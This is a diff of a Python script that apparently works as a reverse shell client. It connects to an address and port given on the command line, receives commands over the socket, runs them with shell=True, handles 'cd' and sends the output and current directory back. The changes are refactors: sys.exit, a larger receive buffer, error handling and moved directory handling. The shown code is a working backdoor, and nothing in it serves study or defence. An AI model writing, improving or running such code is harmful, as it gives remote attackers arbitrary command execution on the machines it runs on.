@@ -23,11 +23,11 @@ def getParam():
     global port
 
     if not len(sys.argv[1:]):
-        exit(0)
+        sys.exit(0)
     try:
         op,ar = getopt.getopt(sys.argv[1:],"a:p:",["address=","port="])
     except:
-        exit(0)
+        sys.exit(0)
 
     noOptionalArg=0
     for o,a in op:
@@ -39,7 +39,7 @@ def getParam():
             port = int(a)        
 
     if noOptionalArg != expectedArgument:
-        exit(0)
+        sys.exit(0)
 
 if __name__ == "__main__":
     getParam()
@@ -50,17 +50,21 @@ if __name__ == "__main__":
     client.sendall(cm.communicate()[0])
 
     while True:
-        command = client.recv(2048).decode("utf-8")
+        try:
+            command = client.recv(4096).decode("utf-8")
+        except:
+            client.close()
+            sys.exit(0)
         if not command:
             client.close()
-            exit(0)
-        if command[:2]=="cd":
-            try:
-                os.chdir(command[2:])
-            except:
-                pass
+            sys.exit(0)
         if len(command)>0:
             cmd = subprocess.Popen(command,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True,text=True)
             out, err = cmd.communicate()
+            if command[:2]=="cd":
+                try:
+                    os.chdir(command[2:].replace(" ","",1))
+                except:
+                    pass
             client.sendall((out + err + "\n" + os.getcwd() + ">").encode("utf-8"))
 
